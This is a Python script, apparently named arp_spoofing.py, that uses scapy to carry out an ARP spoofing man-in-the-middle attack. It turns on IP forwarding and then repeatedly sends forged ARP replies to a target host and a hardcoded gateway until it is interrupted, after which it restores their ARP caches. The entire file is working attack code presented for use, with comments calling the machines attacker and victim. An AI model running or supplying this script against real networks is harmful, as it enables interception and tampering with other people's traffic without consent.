#!/usr/bin/env python3

import scapy.all as scapy 
import time
import sys
import os
from scapy.layers.l2 import ARP                         # create and manipulate ARP packets
from scapy.layers.inet import Ether, IP, ICMP           # create and manipulate ... packets

def _enable_linux_iproute():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # Enable IP forwarding on the attacker's machine

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)                    # creates an ARP request packet
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")    # creates an Ethernet broadcast packet , fff to send all devices
    arp_request_broadcast = broadcast / arp_request     # creates a single packet that is the combination of both packets
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0] # Send Receive Packets, with debugging ,0 to return the first element
    
    return answered_list[0][1].hwsrc                    # return the mac address

def spoof(target_ip, spoof_ip):                         # creates an ARP request packet
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)                   # sends the ARP response packet

def restore(destination_ip, source_ip):                 # restore the ARP cache
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)                   # sends the ARP response packet

def ping_reply(packet):
    if packet.haslayer(ICMP) and packet[ICMP].type == 8: # check if the packet is an ICMP ping request
        src_ip = packet[IP].src                          # assigns the source IP address of the packet   
        dst_ip = packet[IP].dst                          # assigns the dest IP address of the packet  
        src_mac = packet[Ether].src                      # assigns the source MAC
        dst_mac = packet[Ether].dst                      # assigns the dest MAC
        """Craft an ICMP ping reply using the same parameters as the request"""
        reply = Ether(src=dst_mac, dst=src_mac) / IP(src=dst_ip, dst=src_ip) / ICMP(type=0)
        scapy.send(reply, verbose=False)                # Send the reply


if len(sys.argv) < 2:
    print("Usage: ./arp_spoofing.py [target_ip]")
    sys.exit()   
target_ip = sys.argv[1]
gateway_ip = "192.168.0.50" 

"""Start the spoofing attack""" 
try:
    _enable_linux_iproute()
    sent_packets_count = 0                              # init a counter for the number of packets sent
    while True:                                         # keep sending ARP spoofing packets until interrupted
        spoof(target_ip, gateway_ip)                    # send an ARP spoofing packet to the victim device
        spoof(gateway_ip, target_ip)                    # send an ARP spoofing packet to the gateway
        sent_packets_count = sent_packets_count + 2     # two packets sent
        print("\r[*] Packets Sent "+str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")

      